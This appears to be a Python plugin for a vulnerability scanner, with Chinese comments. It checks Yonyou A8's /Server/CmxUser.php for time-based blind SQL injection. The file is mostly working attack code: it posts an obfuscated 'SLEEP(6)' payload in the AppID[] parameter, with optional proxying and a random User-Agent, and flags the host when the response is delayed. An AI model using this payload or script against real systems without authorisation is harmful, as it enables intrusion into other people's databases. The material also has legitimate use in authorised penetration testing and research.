#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友优普a8 CmxUserSQL时间盲注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0157215
author: Lucifer
description: 文件/Server/CmxUser.php中,post参数AppID存在SQL注入。
'''
import urllib
import requests
import time
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


post_data = {
    "UserName": "test",
    "AppID[]": "0 AnD(SeLeCt*FrOm(SeLeCt(SlEeP(6)))PyGh)"
}
payload = "/Server/CmxUser.php?pgid=AddUser_Step4"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        start_time = time.time()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=10, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=10, verify=False)
        con = resp.text
        code = resp.status_code
        if time.time() - start_time >= 6:
            Medusa = "{} 存在用友优普a8 CmxUserSQL时间盲注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass